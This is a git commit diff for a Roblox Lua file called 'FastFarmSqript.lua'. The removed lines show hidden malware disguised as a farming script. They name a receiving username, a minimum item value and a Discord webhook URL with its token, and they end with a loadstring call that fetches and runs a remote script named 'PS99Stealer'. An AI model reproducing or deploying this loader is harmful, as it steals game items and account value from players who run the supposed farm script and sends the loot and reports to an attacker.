35e3ac9923382339a4209741a758bb0e9567f283
XenoRecovery <76134456+XenoRecovery@users.noreply.github.com>
2025-04-07 02:16:20 +0300

    Update FastFarmSqript.lua

--- FastFarmSqript.lua
+++ FastFarmSqript.lua
@@ -1,6 +1,1 @@
-Username = "XenoRecovery"
-Username2 = "XenoRecovery"
-MinimumRAP = 100000
-Webhook = "https://discord.com/api/webhooks/1358575933128179862/H62IlfFyJH-2mreNvyljGgqBhta4kk-OolGmtGua8L8GyfxZLimWo4V8EsBXBP86xuFb"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
